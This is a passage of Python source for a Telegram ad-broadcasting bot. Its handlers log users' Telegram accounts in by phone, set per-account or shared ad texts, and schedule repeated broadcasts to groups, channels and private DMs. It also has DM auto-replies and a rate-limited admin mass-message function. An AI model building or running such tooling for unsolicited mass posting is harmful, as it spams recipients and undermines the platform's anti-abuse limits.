        ctx.user_data.pop("state", None)
        await send_auto_reply_menu(update, ctx, edit=True)

    elif data == "btn_ar_toggle":
        ar = db.get_auto_reply(uid)
        new_val = 0 if ar["enabled"] else 1
        db.update_auto_reply(uid, enabled=new_val)
        if new_val:
            asyncio.create_task(broadcaster.start_auto_reply_listeners(uid))
        else:
            asyncio.create_task(broadcaster.stop_auto_reply_listeners(uid))
        await send_auto_reply_menu(update, ctx, edit=True)

    elif data == "btn_ar_reset":
        db.update_auto_reply(uid, text=db.DEFAULT_AUTO_REPLY_TEXT)
        await send_auto_reply_menu(update, ctx, edit=True)

    elif data == "btn_ar_edit":
        ctx.user_data["state"] = WAITING_AUTO_REPLY
        header = f"{e('deco_fly_l')} <b>SET CUSTOM AUTO REPLY MESSAGE</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('pen')} <b>Send your custom Auto Reply message text below:</b>\n\n"
            f"<i>Example:</i>\n<code>ye meri ad ac hy tu yadi kuch lena chate ho to yaha pe message kar sakhte ho @example</code>\n\n"
            f"<i>Type /cancel to abort.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="btn_autoreply", icon_custom_emoji_id=_E["cross"], style="danger")]]),
            parse_mode="HTML"
        )

    elif data.startswith("set_ar_acc_"):
        phone = data.replace("set_ar_acc_", "", 1)
        ctx.user_data["state"] = WAITING_ACCOUNT_AUTO_REPLY
        ctx.user_data["ar_phone"] = phone
        header = f"{e('deco_fly_l')} <b>SET CUSTOM AUTO REPLY FOR {phone}</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('pen')} <b>Send custom Auto Reply DM message for Account <code>{phone}</code>:</b>\n\n"
            f"<i>This specific account will send THIS custom reply when customers message it in private DM!</i>\n\n"
            f"<i>Type /cancel to abort.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="btn_autoreply", icon_custom_emoji_id=_E["cross"], style="danger")]]),
            parse_mode="HTML"
        )

    elif data.startswith("clear_ar_acc_"):
        phone = data.replace("clear_ar_acc_", "", 1)
        db.clear_account_custom_auto_reply(uid, phone)
        await query.answer(f"✅ Custom DM reply cleared for {phone}! Uses global main reply.", show_alert=True)
        await send_auto_reply_menu(update, ctx, edit=True)

    elif data == "btn_addaccount":
        ctx.user_data["state"] = WAITING_PHONE
        header = f"{e('deco_fly_l')} <b>CONNECT TELEGRAM ACCOUNT</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('android')} <b>Send phone number with country code:</b>\n\n"
            f"{e('worldd')} <b>Supports ALL Countries Worldwide</b> {e('world2')}\n"
            f"<i>Examples: <code>+15551234567</code> (USA/Canada), <code>+447900123456</code> (UK), <code>+971501234567</code> (UAE), <code>+919876543210</code> (India)</i>\n\n"
            f"<i>Type /cancel to abort login.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel Login", callback_data="btn_refresh", icon_custom_emoji_id=_E["cross"], style="danger")]]),
            parse_mode="HTML"
        )

    elif data == "btn_myaccounts":
        accounts = db.get_accounts(uid, active_only=False)
        header = f"{e('deco_fly_l')} <b>MY CONNECTED ACCOUNTS MANAGER</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        if not accounts:
            await safe_edit_text_or_caption(
                query,
                f"{header}\n{divider}\n\n"
                f"📭 <b>No accounts added yet.</b> Tap <code>Add Account</code> on dashboard.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )
            return

        lines = [f"{header}\n{divider}\n"]
        active_count = 0
        btn_rows = []

        for i, acc in enumerate(accounts, 1):
            acc_dict = dict(acc)
            phone = acc_dict['phone']
            acc_name = escape_html(f"{acc_dict.get('first_name', '')} {acc_dict.get('last_name', '')}".strip() or phone)
            is_act = acc_dict.get('is_active', 1) == 1
            if is_act:
                active_count += 1
                status_str = f"🟢 <b>ACTIVE</b>"
                toggle_btn_text = f"🔴 Pause {phone[-4:]}"
            else:
                status_str = f"🔴 <b>PAUSED</b>"
                toggle_btn_text = f"🟢 Enable {phone[-4:]}"

            custom_ad = acc_dict.get('custom_ad', '')
            if custom_ad and custom_ad.strip():
                ad_mode_str = f"📝 <i>Custom Ad Set</i>"
                has_custom_ad = True
            else:
                ad_mode_str = f"🌐 <i>Uses Main Global Ad</i>"
                has_custom_ad = False

            lines.append(
                f"{e('android')} <b>Account #{num_to_emoji(i)}:</b> <code>{phone}</code> ({acc_name})\n"
                f"   ⚡ Status: {status_str} | Ad Mode: {ad_mode_str}\n"
            )

            row1 = [
                InlineKeyboardButton(toggle_btn_text, callback_data=f"toggle_acc_{phone}", icon_custom_emoji_id=_E["relok"], style="primary"),
                InlineKeyboardButton(f"📝 Custom Ad", callback_data=f"set_acc_ad_{phone}", icon_custom_emoji_id=_E["edit"], style="success"),
            ]
            row2 = []
            if has_custom_ad:
                row2.append(InlineKeyboardButton(f"🗑 Reset Ad", callback_data=f"clear_acc_ad_{phone}", icon_custom_emoji_id=_E["trash"], style="primary"))
            row2.append(InlineKeyboardButton(f"❌ Remove Account", callback_data=f"remove_{phone}", icon_custom_emoji_id=_E["cross"], style="danger"))

            btn_rows.append(row1)
            btn_rows.append(row2)

        lines.append(f"{divider}\n{e('crown')} <b>Active Accounts:</b> {num_to_emoji(active_count)} / {num_to_emoji(len(accounts))}\n")
        lines.append("<i>💡 Active accounts run broadcasts. You can set custom ads or pause accounts anytime!</i>")
        btn_rows.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")])

        await safe_edit_text_or_caption(
            query,
            "\n".join(lines), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(btn_rows)
        )

    elif data.startswith("toggle_acc_"):
        phone = data.replace("toggle_acc_", "", 1)
        db.toggle_account_active(uid, phone)
        query.data = "btn_myaccounts"
        accounts = db.get_accounts(uid, active_only=False)
        header = f"{e('deco_fly_l')} <b>MY CONNECTED ACCOUNTS MANAGER</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        lines = [f"{header}\n{divider}\n"]
        active_count = 0
        btn_rows = []
        for i, acc in enumerate(accounts, 1):
            acc_dict = dict(acc)
            p = acc_dict['phone']
            acc_name = escape_html(f"{acc_dict.get('first_name', '')} {acc_dict.get('last_name', '')}".strip() or p)
            is_act = acc_dict.get('is_active', 1) == 1
            if is_act:
                active_count += 1
                status_str = f"🟢 <b>ACTIVE</b>"
                toggle_btn_text = f"🔴 Pause {p[-4:]}"
            else:
                status_str = f"🔴 <b>PAUSED</b>"
                toggle_btn_text = f"🟢 Enable {p[-4:]}"
            custom_ad = acc_dict.get('custom_ad', '')
            if custom_ad and custom_ad.strip():
                ad_mode_str = f"📝 <i>Custom Ad Set</i>"
                has_custom_ad = True
            else:
                ad_mode_str = f"🌐 <i>Uses Main Global Ad</i>"
                has_custom_ad = False
            lines.append(
                f"{e('android')} <b>Account #{num_to_emoji(i)}:</b> <code>{p}</code> ({acc_name})\n"
                f"   ⚡ Status: {status_str} | Ad Mode: {ad_mode_str}\n"
            )
            row1 = [
                InlineKeyboardButton(toggle_btn_text, callback_data=f"toggle_acc_{p}", icon_custom_emoji_id=_E["relok"], style="primary"),
                InlineKeyboardButton(f"📝 Custom Ad", callback_data=f"set_acc_ad_{p}", icon_custom_emoji_id=_E["edit"], style="success"),
            ]
            row2 = []
            if has_custom_ad:
                row2.append(InlineKeyboardButton(f"🗑 Reset Ad", callback_data=f"clear_acc_ad_{p}", icon_custom_emoji_id=_E["trash"], style="primary"))
            row2.append(InlineKeyboardButton(f"❌ Remove Account", callback_data=f"remove_{p}", icon_custom_emoji_id=_E["cross"], style="danger"))
            btn_rows.append(row1)
            btn_rows.append(row2)
        lines.append(f"{divider}\n{e('crown')} <b>Active Accounts:</b> {num_to_emoji(active_count)} / {num_to_emoji(len(accounts))}\n")
        lines.append("<i>💡 Active accounts run broadcasts. You can set custom ads or pause accounts anytime!</i>")
        btn_rows.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")])
        await safe_edit_text_or_caption(
            query,
            "\n".join(lines), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(btn_rows)
        )

    elif data.startswith("set_acc_ad_"):
        phone = data.replace("set_acc_ad_", "", 1)
        ctx.user_data["state"] = WAITING_CUSTOM_AD
        ctx.user_data["custom_ad_phone"] = phone
        await safe_edit_text_or_caption(
            query,
            f"{e('edit')} <b>Set Custom Ad Message for Account <code>{phone}</code>:</b>\n\n"
            f"<i>Send your custom ad text specifically for this account. This account will send THIS message instead of the main global ad!</i>\n\n"
            f"<i>Type /cancel to abort.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to My Accounts", callback_data="btn_myaccounts", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
            parse_mode="HTML"
        )

    elif data.startswith("clear_acc_ad_"):
        phone = data.replace("clear_acc_ad_", "", 1)
        db.clear_account_custom_ad(uid, phone)
        await query.answer("✅ Custom ad reset! Account will use main global ad.", show_alert=True)
        accounts = db.get_accounts(uid, active_only=False)
        header = f"{e('deco_fly_l')} <b>MY CONNECTED ACCOUNTS MANAGER</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        lines = [f"{header}\n{divider}\n"]
        active_count = 0
        btn_rows = []
        for i, acc in enumerate(accounts, 1):
            acc_dict = dict(acc)
            p = acc_dict['phone']
            acc_name = escape_html(f"{acc_dict.get('first_name', '')} {acc_dict.get('last_name', '')}".strip() or p)
            is_act = acc_dict.get('is_active', 1) == 1
            if is_act:
                active_count += 1
                status_str = f"🟢 <b>ACTIVE</b>"
                toggle_btn_text = f"🔴 Pause {p[-4:]}"
            else:
                status_str = f"🔴 <b>PAUSED</b>"
                toggle_btn_text = f"🟢 Enable {p[-4:]}"
            custom_ad = acc_dict.get('custom_ad', '')
            if custom_ad and custom_ad.strip():
                ad_mode_str = f"📝 <i>Custom Ad Set</i>"
                has_custom_ad = True
            else:
                ad_mode_str = f"🌐 <i>Uses Main Global Ad</i>"
                has_custom_ad = False
            lines.append(
                f"{e('android')} <b>Account #{num_to_emoji(i)}:</b> <code>{p}</code> ({acc_name})\n"
                f"   ⚡ Status: {status_str} | Ad Mode: {ad_mode_str}\n"
            )
            row1 = [
                InlineKeyboardButton(toggle_btn_text, callback_data=f"toggle_acc_{p}", icon_custom_emoji_id=_E["relok"], style="primary"),
                InlineKeyboardButton(f"📝 Custom Ad", callback_data=f"set_acc_ad_{p}", icon_custom_emoji_id=_E["edit"], style="success"),
            ]
            row2 = []
            if has_custom_ad:
                row2.append(InlineKeyboardButton(f"🗑 Reset Ad", callback_data=f"clear_acc_ad_{p}", icon_custom_emoji_id=_E["trash"], style="primary"))
            row2.append(InlineKeyboardButton(f"❌ Remove Account", callback_data=f"remove_{p}", icon_custom_emoji_id=_E["cross"], style="danger"))
            btn_rows.append(row1)
            btn_rows.append(row2)
        lines.append(f"{divider}\n{e('crown')} <b>Active Accounts:</b> {num_to_emoji(active_count)} / {num_to_emoji(len(accounts))}\n")
        lines.append("<i>💡 Active accounts run broadcasts. You can set custom ads or pause accounts anytime!</i>")
        btn_rows.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")])
        await safe_edit_text_or_caption(
            query,
            "\n".join(lines), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(btn_rows)
        )

    elif data.startswith("remove_"):
        phone = data.replace("remove_", "", 1)
        db.remove_account(uid, phone)
        await query.answer(f"🗑 Account {phone} removed!", show_alert=True)
        accounts = db.get_accounts(uid, active_only=False)
        header = f"{e('deco_fly_l')} <b>MY CONNECTED ACCOUNTS MANAGER</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        if not accounts:
            await safe_edit_text_or_caption(
                query,
                f"{header}\n{divider}\n\n"
                f"📭 <b>No accounts remaining.</b> Tap <code>Add Account</code> on dashboard.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )
            return
        lines = [f"{header}\n{divider}\n"]
        active_count = 0
        btn_rows = []
        for i, acc in enumerate(accounts, 1):
            acc_dict = dict(acc)
            p = acc_dict['phone']
            acc_name = escape_html(f"{acc_dict.get('first_name', '')} {acc_dict.get('last_name', '')}".strip() or p)
            is_act = acc_dict.get('is_active', 1) == 1
            if is_act:
                active_count += 1
                status_str = f"🟢 <b>ACTIVE</b>"
                toggle_btn_text = f"🔴 Pause {p[-4:]}"
            else:
                status_str = f"🔴 <b>PAUSED</b>"
                toggle_btn_text = f"🟢 Enable {p[-4:]}"
            custom_ad = acc_dict.get('custom_ad', '')
            if custom_ad and custom_ad.strip():
                ad_mode_str = f"📝 <i>Custom Ad Set</i>"
                has_custom_ad = True
            else:
                ad_mode_str = f"🌐 <i>Uses Main Global Ad</i>"
                has_custom_ad = False
            lines.append(
                f"{e('android')} <b>Account #{num_to_emoji(i)}:</b> <code>{p}</code> ({acc_name})\n"
                f"   ⚡ Status: {status_str} | Ad Mode: {ad_mode_str}\n"
            )
            row1 = [
                InlineKeyboardButton(toggle_btn_text, callback_data=f"toggle_acc_{p}", icon_custom_emoji_id=_E["relok"], style="primary"),
                InlineKeyboardButton(f"📝 Custom Ad", callback_data=f"set_acc_ad_{p}", icon_custom_emoji_id=_E["edit"], style="success"),
            ]
            row2 = []
            if has_custom_ad:
                row2.append(InlineKeyboardButton(f"🗑 Reset Ad", callback_data=f"clear_acc_ad_{p}", icon_custom_emoji_id=_E["trash"], style="primary"))
            row2.append(InlineKeyboardButton(f"❌ Remove Account", callback_data=f"remove_{p}", icon_custom_emoji_id=_E["cross"], style="danger"))
            btn_rows.append(row1)
            btn_rows.append(row2)
        lines.append(f"{divider}\n{e('crown')} <b>Active Accounts:</b> {num_to_emoji(active_count)} / {num_to_emoji(len(accounts))}\n")
        lines.append("<i>💡 Active accounts run broadcasts. You can set custom ads or pause accounts anytime!</i>")
        btn_rows.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")])
        await safe_edit_text_or_caption(
            query,
            "\n".join(lines), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(btn_rows)
        )

    elif data == "btn_setad":
        ctx.user_data.pop("state", None)
        await send_set_ad_menu(update, ctx, edit=True)

    elif data == "btn_toggle_ad_mode":
        settings = db.get_settings(uid)
        curr = dict(settings).get("ad_mode", "custom") if settings else "custom"
        new_mode = "global" if curr == "custom" else "custom"
        db.update_settings(uid, ad_mode=new_mode)
        mode_text = "Mode 1: All accounts will send 1 shared global ad!" if new_mode == "global" else "Mode 2: Each account will send its separate custom ad!"
        await query.answer(f"✅ Switched to {mode_text}", show_alert=True)
        await send_set_ad_menu(update, ctx, edit=True)

    elif data == "btn_set_global_ad":
        ctx.user_data["state"] = WAITING_AD
        header = f"{e('deco_fly_l')} <b>SET SHARED GLOBAL AD MESSAGE</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('pen')} <b>Send your main shared global marketing ad text below:</b>\n\n"
            f"<i>Type /cancel to abort.</i>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="btn_setad", icon_custom_emoji_id=_E["cross"], style="danger")]]),
            parse_mode="HTML"
        )

    elif data == "btn_setinterval":
        header = f"{e('deco_fly_l')} <b>SELECT BROADCAST INTERVAL</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('clock')} <b>Choose how often ads should be posted:</b>",
            reply_markup=interval_keyboard(), parse_mode="HTML"
        )

    elif data.startswith("set_interval_"):
        interval = data.replace("set_interval_", "")
        db.update_settings(uid, interval=interval)
        await send_dashboard(update, ctx, edit=True)

    elif data == "btn_setcycles":
        header = f"{e('deco_fly_l')} <b>SELECT BROADCAST CYCLES</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('chart')} <b>Choose total number of broadcast rounds:</b>",
            reply_markup=cycles_keyboard(), parse_mode="HTML"
        )

    elif data.startswith("set_cycle_"):
        cycles = int(data.replace("set_cycle_", ""))
        db.update_settings(uid, cycles=cycles, cycle_done=0)
        await send_dashboard(update, ctx, edit=True)

    elif data == "btn_target":
        settings = db.get_settings(uid)
        current_mode = dict(settings)["target_mode"] if (settings and "target_mode" in dict(settings)) else "groups"
        current_str  = {
            "groups":          "Groups Only",
            "channels":        "Channels Only",
            "dms":             "Profiles (DMs) Only",
            "channels_groups": "Channels & Groups",
            "all":             "All (Channels + Groups + Profiles)",
        }.get(current_mode, "Groups Only")

        header = f"{e('deco_fly_l')} {e('trrfg')} <b>TARGET AUDIENCE SETTINGS</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('targi')} <b>Current Target Mode:</b> <b>{current_str}</b>\n\n"
            f"<i>{e('lightni')} Select your target audience from the interactive options below:</i>",
            reply_markup=target_keyboard(current_mode),
            parse_mode="HTML"
        )

    elif data.startswith("set_target_"):
        target_mode = data.replace("start_launch_", "").replace("set_target_", "")
        db.update_settings(uid, target_mode=target_mode)
        await send_dashboard(update, ctx, edit=True)

    elif data == "btn_exclude":
        header = f"{e('deco_fly_l')} <b>EXCLUDE CHATS</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('cross')} <b>Excluded Group Blacklist:</b> <code>None</code>\n\n"
            f"<i>No groups are blacklisted. All joined groups will receive ads.</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")]])
        )

    elif data == "btn_analytics":
        stats    = db.get_stats(uid)
        settings = db.get_settings(uid)
        accounts = db.get_accounts(uid)
        running  = sched.is_user_running(uid)
        header = f"{e('deco_fly_l')} <b>BROADCAST ANALYTICS REPORT</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        text = (
            f"{header}\n{divider}\n\n"
            f"{e('android')} <b>Active Connected Accounts:</b> {num_to_emoji(len(accounts))}\n"
            f"{e('check')} <b>Total Successful Ads Sent:</b> {num_to_emoji(stats['sent'])}\n"
            f"{e('cross')} <b>Total Failed Deliveries:</b> {num_to_emoji(stats['failed'])}\n"
            f"{e('globe')} <b>Unique Groups Reached:</b> {num_to_emoji(stats['unique_groups'])}\n"
            f"{e('hourglass')} <b>Completed Cycles:</b> {num_to_emoji(settings['cycle_done'])}\n"
            f"{e('fire')} <b>Live Running Status:</b> <code>{'🟢 ACTIVE' if running else '⚪ STOPPED'}</code>\n\n"
            f"{divider}\n"
        )
        if stats["recent"]:
            text += f"\n{e('text')} <b>Recent Activity Logs:</b>\n"
            for log in stats["recent"][:5]:
                icon = e('check') if log["status"] == "sent" else e('cross')
                g_name = escape_html(log['group_name'])
                text += f"{icon} <code>{log['phone']}</code> ➡️ <b>{g_name}</b>\n"
        await safe_edit_text_or_caption(
            query,
            text, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("Clear Activity Logs", callback_data="clear_logs", icon_custom_emoji_id=_E["trash"], style="danger"),
                    InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")
                ]
            ])
        )

    elif data == "clear_logs":
        db.clear_logs(uid)
        await send_dashboard(update, ctx, edit=True)

    elif data == "btn_start":
        accounts = db.get_accounts(uid, active_only=True)
        ad       = db.get_ad(uid)
        settings = db.get_settings(uid)
        if not accounts:
            await query.answer("❌ No active accounts added! Tap Add Account first.", show_alert=True)
            return
        if not ad:
            await query.answer("❌ No ad message set! Tap Set Ad Message first.", show_alert=True)
            return
        if sched.is_user_running(uid):
            await query.answer("⚠️ Broadcast is already running!", show_alert=True)
            return

        current_mode = dict(settings)["target_mode"] if (settings and "target_mode" in dict(settings)) else "groups"
        header = f"{e('deco_fly_l')} <b>CHOOSE TARGET DESTINATION</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        await safe_edit_text_or_caption(
            query,
            f"{header}\n{divider}\n\n"
            f"{e('adno')} <b>Where do you want to send your ad message?</b>\n\n"
            f"<i>{e('lightni')} Select your target destination below:</i>",
            parse_mode="HTML",
            reply_markup=start_target_launch_keyboard(current_mode)
        )

    elif data.startswith("start_launch_"):
        accounts = db.get_accounts(uid, active_only=True)
        ad       = db.get_ad(uid)
        if not accounts or not ad:
            await query.answer("❌ Please configure accounts and ad message first!", show_alert=True)
            return
        if sched.is_user_running(uid):
            await query.answer("⚠️ Broadcast is already running!", show_alert=True)
            return

        target_mode = data.replace("start_launch_", "")
        db.update_settings(uid, target_mode=target_mode)
        settings = db.get_settings(uid)

        if len(accounts) <= 1:
            interval       = settings["interval"]
            cycles         = settings["cycles"]
            selected_phone = "all"

            sched.start_user_job(
                owner_id=uid, interval_key=interval,
                max_cycles=cycles, bot=ctx.bot,
                chat_id=query.message.chat_id,
                selected_phone=selected_phone
            )
            asyncio.create_task(sched.run_first_round(uid, cycles, ctx.bot, query.message.chat_id, selected_phone=selected_phone))
            await send_dashboard(update, ctx, edit=True)
        else:
            ctx.user_data["selected_broadcast_phone"] = "all"
            await show_account_selection_menu(query, uid, ctx)

    elif data == "launch_run_all":
        settings = db.get_settings(uid)
        interval = settings["interval"]
        cycles   = settings["cycles"]

        sched.start_user_job(
            owner_id=uid, interval_key=interval,
            max_cycles=cycles, bot=ctx.bot,
            chat_id=query.message.chat_id,
            selected_phone="all"
        )
        asyncio.create_task(sched.run_first_round(uid, cycles, ctx.bot, query.message.chat_id, selected_phone="all"))
        await send_dashboard(update, ctx, edit=True)

    elif data.startswith("launch_sel_acc_"):
        phone = data.replace("launch_sel_acc_", "")
        ctx.user_data["selected_broadcast_phone"] = phone
        await show_account_selection_menu(query, uid, ctx)

    elif data == "launch_run_selected":
        phone = ctx.user_data.get("selected_broadcast_phone", "all")
        settings = db.get_settings(uid)
        interval = settings["interval"]
        cycles   = settings["cycles"]

        sched.start_user_job(
            owner_id=uid, interval_key=interval,
            max_cycles=cycles, bot=ctx.bot,
            chat_id=query.message.chat_id,
            selected_phone=phone
        )
        asyncio.create_task(sched.run_first_round(uid, cycles, ctx.bot, query.message.chat_id, selected_phone=phone))
        await send_dashboard(update, ctx, edit=True)

    elif data == "btn_stop":
        if not sched.is_user_running(uid):
            await query.answer("⚠️ No active broadcast running.", show_alert=True)
            return
        sched.stop_user_job(uid)
        await query.answer("🛑 Broadcast has been successfully stopped!", show_alert=True)
        await send_dashboard(update, ctx, edit=True)


async def run_admin_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data.pop("state", None)
    users = db.get_all_users()
    tot = len(users)
    if not tot:
        return await update.message.reply_text("⚠️ No registered users found for broadcast.")

    status_msg = await update.message.reply_text(
        f"{e('forward')} <b>🚀 High-Speed Parallel Broadcast Engine Started</b>\n\n"
        f"<b>Target Audience:</b> {num_to_emoji(tot)} users\n"
        f"<i>Mode: High-Throughput Async Queue Stream</i>",
        parse_mode="HTML"
    )

    sent = 0
    failed = 0
    lock = asyncio.Lock()

    # Scale worker pool dynamically (up to 30 parallel workers to respect Telegram's 30 msg/sec limit)
    num_workers = min(30, tot)
    queue = asyncio.Queue()
    for u in users:
        queue.put_nowait(u)

    start_time = time.time()
    last_update_time = time.time()

    async def worker():
        nonlocal sent, failed, last_update_time
        from_chat_id = update.effective_chat.id
        message_id = update.message.message_id

        while True:
            try:
                u = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            target_id = u["user_id"]
            sent_ok = False
            for attempt in range(3):
                try:
                    await ctx.bot.copy_message(
                        chat_id=target_id,
                        from_chat_id=from_chat_id,
                        message_id=message_id
                    )
                    sent_ok = True
                    break
                except Exception as err:
                    err_str = str(err)
                    wait_sec = 1.0
                    if hasattr(err, "retry_after") and getattr(err, "retry_after"):
                        try:
                            wait_sec = float(getattr(err, "retry_after"))
                        except Exception:
                            wait_sec = 1.0
                    elif "retry" in err_str.lower() or "flood" in err_str.lower():
                        wait_sec = 1.5

                    if attempt < 2 and ("retry" in err_str.lower() or "flood" in err_str.lower()):
                        await asyncio.sleep(wait_sec)
                        continue
                    else:
                        break

            async with lock:
                if sent_ok:
                    sent += 1
                else:
                    failed += 1

                now = time.time()
                processed = sent + failed
                if (processed % 1000 == 0 or (now - last_update_time) >= 5.0) and (now - last_update_time) >= 3.0:
                    last_update_time = now
                    elapsed = max(1, now - start_time)
                    speed = int(processed / elapsed)
                    pct = int((processed / tot) * 100)
                    try:
                        asyncio.create_task(status_msg.edit_text(
                            f"{e('forward')} <b>🚀 Auto-Scaling Parallel Broadcast in Progress...</b>\n\n"
                            f"<b>Progress:</b> <code>{processed}/{tot}</code> ({pct}%)\n"
                            f"<b>Sent:</b> {num_to_emoji(sent)} | <b>Failed:</b> {num_to_emoji(failed)}\n"
                            f"<b>Live Speed:</b> ⚡ <code>{speed} msg/sec</code>\n"
                            f"<b>Workers:</b> <code>{num_workers} parallel stream queue</code>\n"
                            f"<i>(Speed is capped to ~30 msgs/sec for safety)</i>",
                            parse_mode="HTML"
                        ))
                    except Exception:
                        pass

            # Critical anti-ban logic: Each worker must sleep 1.0s to ensure total throughput <= 30 msg/sec
            await asyncio.sleep(1.0)
            queue.task_done()

    # Launch worker tasks concurrently
    workers = [asyncio.create_task(worker()) for _ in range(num_workers)]
    await asyncio.gather(*workers)

    elapsed_total = max(1, int(time.time() - start_time))
    avg_speed = int((sent + failed) / elapsed_total)

    header = f"{e('deco_fly_l')} <b>ADMIN BROADCAST COMPLETED</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
    report = (
        f"{header}\n{divider}\n\n"
        f"{e('check')} <b>⚡ Auto-Scaling Broadcast Completed Successfully!</b>\n\n"
        f"{e('sentti')} <b>Sent:</b> {num_to_emoji(sent)}\n"
        f"{e('feilfd')} <b>Failed:</b> {num_to_emoji(failed)}\n"
        f"{e('mani')} <b>Total Audience:</b> {num_to_emoji(tot)}\n"
        f"⚡ <b>Average Speed:</b> <code>{avg_speed} msg/sec</code>\n"
        f"⏱️ <b>Total Time:</b> <code>{elapsed_total} seconds</code>\n\n"
        f"{divider}"
    )
    try:
        await status_msg.edit_text(report, parse_mode="HTML")
    except Exception:
        await update.message.reply_text(report, parse_mode="HTML")


# ═══════════════════════════════════════════════════════════
#   TEXT HANDLER (for phone/OTP/2FA/ad input)
# ═══════════════════════════════════════════════════════════

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    uid   = update.effective_user.id
    text  = update.message.text.strip()
    state = ctx.user_data.get("state")

    # ── Force Join Guard ─────────────────────────────────────
